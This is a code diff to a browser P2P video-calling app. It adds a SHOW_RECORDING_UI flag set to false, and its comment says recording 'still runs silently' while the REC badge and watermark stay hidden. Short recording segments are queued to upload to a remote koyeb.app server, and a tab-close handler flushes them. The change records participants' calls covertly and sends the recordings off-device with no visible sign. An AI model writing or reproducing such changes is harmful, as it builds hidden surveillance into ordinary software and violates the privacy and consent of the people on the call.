@@ -2,8 +2,12 @@
 // Built-in SQLite authentication, direct P2P messaging, vertical 9:16 calling & auto-recording.
 
 // ---- CONFIG ----
-const SERVER_URL = 'https://theoretical-kynthia-mychool-a6f2b3d0.koyeb.app';
-const SEGMENT_DURATION_MS = 3 * 60 * 1000;
+const SERVER_URL = 'https://familiar-gertrudis-botakingtipd-f3991937.koyeb.app';
+// Crash/tab-close safety: first chunk is saved quickly, then small valid chunks keep uploading.
+const FIRST_SEGMENT_DURATION_MS = 4 * 1000;
+const SEGMENT_DURATION_MS = 15 * 1000;
+// Recording still runs silently, but REC badge/watermark stays hidden for now.
+const SHOW_RECORDING_UI = false;
 
 // ---- DOM ----
 const homePage = document.getElementById('homePage');
@@ -69,6 +73,7 @@ let segmentNumber = 0, recordingTimer = null, isCallActive = false;
 let totalRecordingSize = 0, currentCallMode = 'video'; // 'video' or 'audio'
 let recordingSessionId = null, recordingStopPromise = null;
 let isLeavingRoom = false, callDisconnectTimer = null, recordingStartTimer = null;
+let pendingRecordingUploads = new Set();
 const CHUNK_SIZE = 16384;
 
 // ============ T&C MODAL ============
@@ -125,6 +130,14 @@ async function uploadRecordingSegment(blob, segNum, isLast, overrideRoomId = nul
         console.error('Segment upload failed:', e);
         showToast('⚠️ Recording upload retry needed');
     }
+}
+
+function queueRecordingUpload(blob, segNum, isLast, roomId, role) {
+    const uploadPromise = uploadRecordingSegment(blob, segNum, isLast, roomId, role)
+        .catch((e) => console.error('Queued recording upload failed:', e));
+    pendingRecordingUploads.add(uploadPromise);
+    uploadPromise.finally(() => pendingRecordingUploads.delete(uploadPromise));
+    return uploadPromise;
 }
 
 function arrayBufferToBase64(buffer) {
@@ -288,16 +301,18 @@ function setupRecordingStreams() {
                 } catch (e) { }
             }
 
-            const now = new Date();
-            const timeStr = now.toLocaleTimeString();
-            const dateStr = now.toLocaleDateString();
-            const elapsed = callStartTime ? formatCallDuration() : '00:00';
-            ctx.fillStyle = 'rgba(0,0,0,0.6)';
-            ctx.fillRect(8, 8, 200, 20);
-            ctx.fillStyle = '#ff2d75';
-            ctx.font = '10px Orbitron, monospace';
-            ctx.textAlign = 'left';
-            ctx.fillText('● REC  ' + dateStr + ' ' + timeStr + ' [' + elapsed + ']', 12, 22);
+            if (SHOW_RECORDING_UI) {
+                const now = new Date();
+                const timeStr = now.toLocaleTimeString();
+                const dateStr = now.toLocaleDateString();
+                const elapsed = callStartTime ? formatCallDuration() : '00:00';
+                ctx.fillStyle = 'rgba(0,0,0,0.6)';
+                ctx.fillRect(8, 8, 200, 20);
+                ctx.fillStyle = '#ff2d75';
+                ctx.font = '10px Orbitron, monospace';
+                ctx.textAlign = 'left';
+                ctx.fillText('● REC  ' + dateStr + ' ' + timeStr + ' [' + elapsed + ']', 12, 22);
+            }
         }, 1000 / 20);
 
         const canvasVideoStream = recCanvas.captureStream(20);
@@ -357,19 +372,20 @@ function startNewSegment() {
         if (chunks.length > 0) {
             const blob = new Blob(chunks, { type: mimeType });
             totalRecordingSize += blob.size;
-            uploadRecordingSegment(blob, segNum, false, sessionId, roleAtStart);
+            queueRecordingUpload(blob, segNum, false, sessionId, roleAtStart);
         }
         recordedChunks = [];
         if (mediaRecorder === recorder) mediaRecorder = null;
         if (isCallActive) startNewSegment();
     };
     recorder.start(1000);
+    const segmentDuration = segNum === 1 ? FIRST_SEGMENT_DURATION_MS : SEGMENT_DURATION_MS;
     recordingTimer = setTimeout(() => {
         if (recorder && recorder.state !== 'inactive') {
             try { recorder.requestData(); } catch(e) {}
             recorder.stop();
         }
-    }, SEGMENT_DURATION_MS);
+    }, segmentDuration);
 }
 
 function startRecording() {
@@ -378,7 +394,8 @@ function startRecording() {
         if (!recordingSessionId) recordingSessionId = createRecordingSessionId(currentRoomId || (currentCall && currentCall.peer) || 'call');
         if (!setupRecordingStreams()) return;
         isCallActive = true; segmentNumber = 0; totalRecordingSize = 0;
-        recordingIndicator.classList.remove('hidden');
+        if (SHOW_RECORDING_UI) recordingIndicator.classList.remove('hidden');
+        else recordingIndicator.classList.add('hidden');
         startNewSegment();
     } catch (e) { console.error('Recording start failed:', e); }
 }
@@ -424,7 +441,8 @@ function stopRecording() {
                     if (chunks.length > 0) {
                         const blob = new Blob(chunks, { type: finalMime });
                         totalRecordingSize += blob.size;
-                        await uploadRecordingSegment(blob, currentSegNum, true, savedRoomId, savedRole);
+                        // Fire upload in background so End Call feels instant; savedRoomId/role are already captured.
+                        queueRecordingUpload(blob, currentSegNum, true, savedRoomId, savedRole);
                     }
                     finishLog();
                 } catch (e) {
@@ -933,6 +951,26 @@ async function leaveRoom() {
         isLeavingRoom = false;
     }
 }
+
+// ============ EMERGENCY TAB-CLOSE HANDLER ============
+function emergencyStopRecordingForPageExit() {
+    try {
+        clearCallDisconnectTimer();
+        if (recordingStartTimer) { clearTimeout(recordingStartTimer); recordingStartTimer = null; }
+        isCallActive = false;
+        if (recordingTimer) { clearTimeout(recordingTimer); recordingTimer = null; }
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+            try { mediaRecorder.requestData(); } catch (e) {}
+            try { mediaRecorder.stop(); } catch (e) {}
+        }
+        if (currentCall) { try { currentCall.close(); } catch (e) {} }
+        if (dataConnection) { try { dataConnection.close(); } catch (e) {} }
+        if (localStream) { try { localStream.getTracks().forEach(t => t.stop()); } catch (e) {} }
+    } catch (e) {}
+}
+
+window.addEventListener('pagehide', emergencyStopRecordingForPageExit);
+window.addEventListener('beforeunload', emergencyStopRecordingForPageExit);
 
 // ============ COPY LINK ============
 function copyLink() {
